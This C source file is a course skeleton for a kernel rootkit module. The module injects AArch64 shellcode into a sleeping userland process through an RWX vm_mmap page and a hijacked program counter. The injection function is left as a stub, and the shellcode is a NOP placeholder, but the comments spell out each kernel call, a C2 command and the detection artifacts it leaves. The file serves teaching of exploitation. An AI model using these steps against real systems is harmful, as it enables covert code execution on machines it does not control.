/*
 * inject.c — Userland shellcode injection
 *
 * Capstone: Kernel Rootkit + Exploitation
 *
 * Hijacks a sleeping userland process to execute attacker-controlled
 * AArch64 shellcode, then restores the process to continue normally.
 *
 * This is the "crown jewel" — combining kernel memory access, register
 * manipulation, and raw AArch64 assembly (connecting back to HW1).
 *
 * Mechanism:
 *   1. Operator sends: mykill inject <target_pid> [shellcode.bin]
 *   2. C2 handler calls schedule_inject(target_pid) (deferred to workqueue)
 *   3. Workqueue context: allocate RWX page via vm_mmap in target
 *   4. Copy shellcode to the new page via copy_to_user (under kthread_use_mm)
 *   5. Save original PC in x28, redirect PC to shellcode
 *   6. Set TIF_SIGPENDING + wake_up_process to trigger execution
 *   7. Process wakes → executes shellcode → br x28 back to original PC
 *
 * Students write the shellcode in shellcode/ or use tools/inject_test.bin
 * to verify the injection machinery works.
 *
 * Reference:
 *   - vm_mmap() — allocate memory in another process's address space
 *   - kthread_use_mm() — borrow another process's mm for copy_to_user
 *   - task_pt_regs() — access saved register state of a sleeping process
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/sched/mm.h>
#include <linux/sched/task.h>
#include <linux/pid.h>
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/uaccess.h>
#include <linux/mman.h>
#include <asm/ptrace.h>

#include "rootkit.h"

/* ═══════════════════════════════════════════════════════════════════════════
 * Shellcode — students fill this in
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * This byte array is the assembled output of your shellcode .S file.
 * Students write the .S file, cross-assemble with:
 *
 *   aarch64-linux-gnu-as inject_shellcode.S -o shellcode.o
 *   aarch64-linux-gnu-objcopy -O binary shellcode.o shellcode.bin
 *   xxd -i shellcode.bin
 *
 * Then paste the resulting bytes here.
 *
 * The shellcode must:
 *   1. Save caller-saved registers on the stack
 *   2. Execute payload (e.g., create /tmp/pwned via openat/write/close)
 *   3. Restore all saved registers
 *   4. Set x0 to -EINTR (-4) so the interrupted syscall restarts
 *   5. br x28 — return to original PC (set by the kernel module)
 *
 * You can test with the provided tools/inject_test.bin first to verify
 * the injection mechanism works before writing your own shellcode.
 *
 * NOTE on I-cache coherency:
 *   On real AArch64 hardware, writing to a code page via the data cache
 *   doesn't automatically invalidate the instruction cache. However:
 *   - QEMU TCG models coherent caches (DIC=1 equivalent)
 *   - On real hardware you'd need flush_icache_range()
 */

/* TODO: Replace this placeholder with your assembled shellcode bytes.
 *
 * Example (NOP sled + br x28 — does nothing useful but tests the mechanism):
 *   static const unsigned char shellcode[] = {
 *       0x1f, 0x20, 0x03, 0xd5,   // nop
 *       0x1f, 0x20, 0x03, 0xd5,   // nop
 *       0x60, 0x00, 0x80, 0x92,   // mov x0, #-4 (-EINTR)
 *       0x80, 0x03, 0x1f, 0xd6,   // br x28
 *   };
 *
 * Your real shellcode should create /tmp/pwned with "INJECTED-1337"
 * (matching the test harness check).
 */
static const unsigned char shellcode[] = {
	/* Placeholder: nop + mov x0,-EINTR + br x28 */
	0x1f, 0x20, 0x03, 0xd5,   /* nop */
	0x1f, 0x20, 0x03, 0xd5,   /* nop */
	0x60, 0x00, 0x80, 0x92,   /* mov x0, #-4 (-EINTR) */
	0x80, 0x03, 0x1f, 0xd6,   /* br x28 */
};

#define SHELLCODE_LEN sizeof(shellcode)

/* ═══════════════════════════════════════════════════════════════════════════
 * Inject shellcode into target process
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * TODO: Implement inject_trigger()
 *
 * Called from workqueue context (schedule_inject in c2.c).
 * This means kthread_use_mm / vm_mmap / copy_to_user are safe.
 *
 * Steps:
 * 1. Find the target task:
 *    rcu_read_lock();
 *    task = pid_task(find_vpid(target), PIDTYPE_PID);
 *    if (task) get_task_struct(task);
 *    rcu_read_unlock();
 *    — Return -ESRCH if not found
 *
 * 2. Get mm and verify target has an address space:
 *    mm = task->mm;
 *    if (!mm) return -EINVAL;
 *
 * 3. Verify the target is sleeping:
 *    if (task->__state == TASK_RUNNING) return -EBUSY;
 *
 * 4. Allocate RWX page in target's address space:
 *    mmgrab(mm);
 *    kthread_use_mm(mm);
 *    inject_addr = vm_mmap(NULL, 0, PAGE_SIZE,
 *                          PROT_READ | PROT_WRITE | PROT_EXEC,
 *                          MAP_ANONYMOUS | MAP_PRIVATE, 0);
 *    — Check IS_ERR_VALUE(inject_addr)
 *
 * 5. Copy shellcode to the new page:
 *    copy_to_user((void __user *)inject_addr, shellcode, SHELLCODE_LEN);
 *    kthread_unuse_mm(mm);
 *    mmdrop(mm);
 *
 * 6. Redirect the program counter:
 *    struct pt_regs *target_regs = task_pt_regs(task);
 *    target_regs->regs[28] = target_regs->pc;  // save original PC in x28
 *    target_regs->pc = inject_addr;              // jump to shellcode
 *    target_regs->syscallno = -1;                // prevent syscall restart
 *
 * 7. Wake the target so it runs the shellcode:
 *    set_tsk_thread_flag(task, TIF_SIGPENDING);
 *    wake_up_process(task);
 *
 * 8. Release: put_task_struct(task);
 *    Log: pr_info("rootkit: injected %zu bytes into PID %d at 0x%lx\n", ...)
 *
 * NOTE: The vm_mmap approach leaves no COW artifacts — the page is freshly
 * allocated, not a modified copy of an existing code page. But it IS a
 * detectable artifact (anonymous RWX mapping in /proc/<pid>/maps).
 */
int inject_trigger(pid_t target)
{
	/* TODO */
	pr_warn("rootkit: inject_trigger() not implemented yet\n");
	return -ENOSYS;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Init / Exit (currently no-ops — injection is stateless)
 * ═══════════════════════════════════════════════════════════════════════════ */

int inject_init(void)
{
	pr_info("rootkit: injection subsystem ready\n");
	return 0;
}

void inject_exit(void)
{
	pr_info("rootkit: injection subsystem cleaned up\n");
}
